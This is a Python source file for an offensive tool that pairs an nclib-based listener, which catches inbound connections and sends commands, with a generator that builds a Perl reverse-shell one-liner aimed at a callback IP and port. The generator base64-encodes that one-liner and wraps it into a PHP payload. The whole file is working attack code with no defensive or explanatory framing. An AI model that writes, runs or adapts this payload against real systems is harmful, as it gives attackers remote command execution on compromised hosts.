import nclib
import sys
import threading
import base64

class Listener:

    #__ip_address = "0.0.0.0"
    #__port_number = 0

    def __init__(self):
        """ Load Listener """
        print("Initialising Listener")
    
    def start(self, local_ip, local_port):
        """ Set Listener to Run """

        print("Starting listener on {0}:{1}... ".format(local_ip, local_port))

        self.nc = nclib.Netcat(listen=(local_ip,int(local_port)))
        print("Listener has recieved an inbound connection")

        return self.nc
    
    def send(self, msg):
        try:
            self.nc.send_line(msg.encode())
            response = self.nc.recv()
            print(response.decode())
        except AttributeError:
            print("No session created, quitting.")
            sys.exit(0)
    
    def stop(self):
        #self.client.close()
        try:
            self.nc.close()
        except:
            print("No listener to close")

    def write(self, data):
        return self.sock.send(data)

class ReverseShell:
    def define(self):
        self.payload='$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"#\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
    def calibrate(self,callback_ip,callback_port):
        payload = self.payload.split("#")
        self.payload = "{0}{1}:{2}{3}".format(payload[0],callback_ip,callback_port,payload[1])
        self.payload = "perl -MIO -e '{0}'".format(self.payload)
    def pack(self):
        encoded = base64.b64encode(self.payload.encode())
        payload = "/*<?php\n"
        payload += "$c = base64_decode({0});".format(encoded)
        payload += open("payload.php","r").read()
        print(payload)

